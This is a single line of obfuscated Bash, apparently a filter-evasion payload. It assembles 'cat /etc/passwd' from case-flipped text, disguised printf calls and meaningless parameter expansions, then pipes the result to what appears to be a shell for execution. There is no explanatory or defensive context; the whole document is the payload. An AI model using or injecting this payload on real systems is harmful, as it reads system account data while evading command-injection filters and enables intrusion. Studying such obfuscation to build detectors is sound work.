${*%%8}  $'\x70'rin't'f %s  "$(    YT='CAT /ETC/PASSWD'  ;  ${*%e}\pr""intf  %s "${YT~~}"${@##,}   )" ${*,}|${!#} 

